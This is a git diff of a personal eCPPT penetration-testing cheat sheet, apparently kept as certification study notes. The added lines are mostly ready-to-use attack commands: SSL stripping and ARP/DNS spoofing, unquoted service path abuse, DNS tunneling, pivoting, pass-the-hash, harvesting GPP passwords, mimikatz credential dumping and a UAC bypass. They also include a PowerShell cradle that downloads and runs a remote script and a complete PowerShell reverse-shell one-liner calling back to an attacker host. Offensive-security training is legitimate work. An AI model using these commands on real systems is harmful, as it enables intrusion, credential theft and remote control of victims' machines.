@@ -1,6 +1,5 @@
 ## eCPPT ##
 
-
 Architecture Fundamentals ::
 	
 	CPU:
@@ -456,6 +455,10 @@ Information Gathering ::
 
 							* dig @<DOMAIN IP> target.com -t AXFR +nocookie
 
+			    determine domain name:
+
+			    	dig @<IP> -x <DOMAIN IP> +nocookie
+
 
 				determine subdomains:
 
@@ -599,7 +602,7 @@ Enumeration ::
 
 
 	Scan network from within a host:
-		run autoroute -s <IP>/Subnet
+		run autoroute -s <IP>(.0)/Subnet
 		^Z
 		use <IP>canner/portscan/tcp(or udp)
 
@@ -609,7 +612,7 @@ Enumeration ::
 	
 
 
-Sniffing & MITM::
+Sniffing & MITM ::
 	
 	Passive sniffing - listening to packets on the network in order to gather sensitive information, using Wireshark for instance.
 
@@ -691,3 +694,145 @@ Sniffing & MITM::
 			multirelay.py -t <target> -u ALL
 			
 
+	setup port redirection -> iptables -t nat -A PREROUTING -p tcp  --destination-port 80 -j REDIRECT --to-ports 8080
+
+	sslstrip -a -f -l 8080 -w ssl_usr
+
+	bettercap -G <TARGET_IP> -T <VICTIM_IP> --proxy-https
+
+	python mitmf.py -i eth0 --spoof -arp --dns --hsts --gateway <GATEWAY_IP> --targets <TARGET_IP>
+
+
+	see which port is enabled - netstat -an |findstr :<port>
+	see firewall rules - netsh firewall show config
+	enable RDP - reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+	open RDP on FW - netsh firewall add portopening TCP 3389 "Remote Desktop"
+
+
+	Unquoted Paths: 
+		
+		wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+		if found, go through directories and list permissions with icacls on each dir.
+		Insert payload(and set to windows/shell_reverse_tcp) and BAM.
+
+		# sc qc "vulnsvc" -> Query service config
+		# try sc stop/start
+		# shutdown /r /t 0 -> Restart endpoint to restart services aggressively
+
+
+	DNS Tunneling:
+
+		iodine -P '<PASS>' ns1.site.com -T CNAME -r -f 
+
+		To SSH Socks proxy:
+
+			ssh <user>@<nameserver IP> -D<LHOST-DNS CONNECTION>:<PORT> -N -C
+
+Pivoting ::
+
+	use post/windows/manage/autoroute
+	set SESSION <SESSION>
+	set SUBNET <ROUTE.0>
+	run
+
+	to proxy through the pivot, exploit again with pivot IP.
+
+
+	Pass the hash:
+
+		meterpreter > hashdump
+		exploit/windows/smb/psexec
+		set SMBUser
+		set SMBPass <hash>
+		exploit
+
+	Info Gathering:
+
+		use sniffer
+		sniffer_interfaces
+		sniffer_start <interface number>
+		sniffer_dump <interface number> <filename.pcap>
+		sinffer_stop <interface number>
+		use post/multi/recon/local_exploit_suggester
+
+
+	sshuttle -r root@<IP> --ssh-cmd "ssh -i ird_rsa" <remote subnet> -x <IP>
+
+
+	SessionGopher:
+
+		powershell.exe -nop -ep bypass -C iex (New-Object Net.Webclient).DownloadString('http://<SimpleHTTPServer>/SessionGopher.ps1'); Invoke-SessionGopher 
+
+		-Thorough - more info
+
+	Active Directory:
+
+		load extapi
+		adsi_computer_enum <USERDNSDOMAIN> - enumerate AD computers
+		adsi_user_enum <USERDNSDOMAIN> - enumerate AD users
+
+	Creds stealing:
+
+		AD policies - %USERDNSDOMAIN%\Policies
+		Sysvol share - %LOGONSERVE%\Sysvol
+
+		Than you can find user creation policies by searching for groups.xml files in the policies directory.
+		System administrators usually use AD policies to deploy a local administrator account in a domain environment.
+
+		find groups.xml in {...}\Machine\Preferences\Groups\Groups.xml
+		then decrypt the password with gpp-decrypt.
+
+		then you can run execute a reverse shell by using post/windows/manage/run_as
+
+		then if getsystem fails use -> exploit/windows/local/bypassuac_injection
+
+
+		load mimikatz
+		kerberos - try to harvest users and passwords
+		wdigest - try harde
+		privilege::debug
+		token::elevate
+		lsadump::sam
+
+		evil-winrm:
+
+			evil-winrm -u <user> -H <hash> -i <IP> (or -p for password instead of hash) -s <include scripts path>
+
+			upload LOCAL_FILEPATH REMOTE_FILEPATH
+			download REMOTE_FILEPATH LOCAL_FILEPATH
+			include Empire scripts from - /opt/Empire/data/module_source/<path>/<to>/<script>
+
+		port forward for RDP:
+
+			portfwd add -L 127.0.0.1 -l 3389 -r <remote machine> -p 3389
+			rdesktop -u <domain>\<user> -p "<password>" 127.0.0.1
+			
+		file share with RDP:
+
+			xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
+
+
+		socks4a & proxychains:
+
+			socks4a:
+			use auxiliary/server/socks4a
+			set SRVHOST as LHOST, and SRVPORT as the port of the pivot.
+
+			proxychains:
+			set proxychains to connect through the newly made socks4 proxy.
+			run commands freely.
+
+		chisel:
+
+			chisel server -p <SRVPORT> --socks5
+			chisel client <RHOST>:<SRVPORT> <PROXY_PORT>:socks
+
+			netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=<PORT>
+
+
+HELPFUL STUFF ::
+
+	powershell rev shell:
+
+		powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
